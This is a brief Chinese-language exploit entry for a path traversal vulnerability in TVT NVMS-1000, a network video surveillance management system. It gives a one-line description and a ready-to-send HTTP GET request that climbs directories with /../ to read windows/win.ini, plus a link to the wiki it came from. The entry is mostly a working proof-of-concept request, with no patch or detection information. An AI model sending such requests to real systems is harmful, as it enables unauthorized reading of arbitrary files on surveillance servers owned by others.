# TVT数码科技 NVMS-1000 路径遍历漏洞

TVT数码科技 TVT NVMS-1000是中国TVT数码科技公司的一套网络监控视频管理系统。 TVT数码科技 TVT NVMS-1000中存在路径遍历漏洞。远程攻击者可通过发送包含/../的特制URL请求利用该漏洞查看系统上的任意文件。


```
GET /../../../../../../../../../../../../windows/win.ini HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:88.0) Gecko/20100101 Firefox/88.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
```

ref：

http://wiki.xypbk.com/Web%E5%AE%89%E5%85%A8/TVT%E6%95%B0%E7%A0%81%E7%A7%91%E6%8A%80-NVMS-1000/TVT%E6%95%B0%E7%A0%81%E7%A7%91%E6%8A%80%20NVMS-1000%20%E8%B7%AF%E5%BE%84%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E.md?btwaf=20301571